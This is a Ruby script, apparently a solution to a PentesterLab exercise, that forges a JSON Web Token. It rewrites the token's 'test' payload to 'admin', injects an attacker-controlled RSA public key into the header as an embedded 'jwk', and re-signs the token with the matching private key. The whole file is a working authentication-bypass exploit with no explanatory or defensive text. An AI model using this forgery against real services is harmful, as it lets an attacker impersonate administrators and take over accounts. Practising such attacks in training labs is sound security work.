require 'base64'
require 'openssl'
require 'json'

cookie = "eyJhbGciOiJSUzI1NiIsImtpZCI6IlMxUWl3U0o3dHA3YmM0Sy1tenZWSlRHWlFVa2tWVGVJTzhkM19HVXdQdU0ifQ.dGVzdA.B0Jc1jX6B-K04ibAunNT22SbqxM-Igi6oYcxy5_PpTgTwlU9o5EknszoHszbdxlbxo8L8sifsajILCBERkgnojMNd_m4rw3nfR3dLrVATJWhDk4pEgY_lIg0lxlqPtdnNhKjBUPj4oOOnx55_-vO-MiVxtBRNJ0DgmG36mlZNZns3jC63orkBHfFiDgH-4EJ-h36wCsDFJZJIaRlL8y4i5MGWL02PtVF66_P_gAvD38ogEJhoOr4n_vDl04AkAAtwMObP9i7g86yFMuRYfUyt8LlYPc7y7X-9xX_DIu07ZRdJdUREomUUch1ogIqCXHejK5z6dnV_rvNZ_kPymZfUw"

header, payload, signature = cookie.split('.')

decoded_header = Base64.decode64(header)
puts decoded_header
#{"alg":"RS256","kid":"S1QiwSJ7tp7bc4K-mzvVJTGZQUkkVTeIO8d3_GUwPuM"}

decoded_payload = Base64.decode64(payload)
puts decoded_payload

tampered_payload = Base64.urlsafe_encode64(decoded_payload.gsub("test","admin")).gsub("=","")
puts tampered_payload

priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub = priv.public_key
n = Base64.urlsafe_encode64(pub.n.to_s(2), padding: false)
e = Base64.urlsafe_encode64(pub.e.to_s(2), padding: false)

jwk = {
  "kty": "RSA",
  "kid": "pentesterlabs.com",
  "use": "sig",
  "n": n,
  "e": e
}

tampered_header = {"alg":"RS256","kid":"S1QiwSJ7tp7bc4K-mzvVJTGZQUkkVTeIO8d3_GUwPuM","jwk": {"kty": "RSA", "kid": "pentesterlabs.com", "use": "sig", "n": n, "e": e}}.to_json
puts tampered_header
encoded_header = Base64.urlsafe_encode64("#{tampered_header}")

exploit = encoded_header+"."+tampered_payload

signed = Base64.urlsafe_encode64(priv.sign(OpenSSL::Digest::SHA256.new, exploit)).gsub("=","")

puts exploit+"."+signed
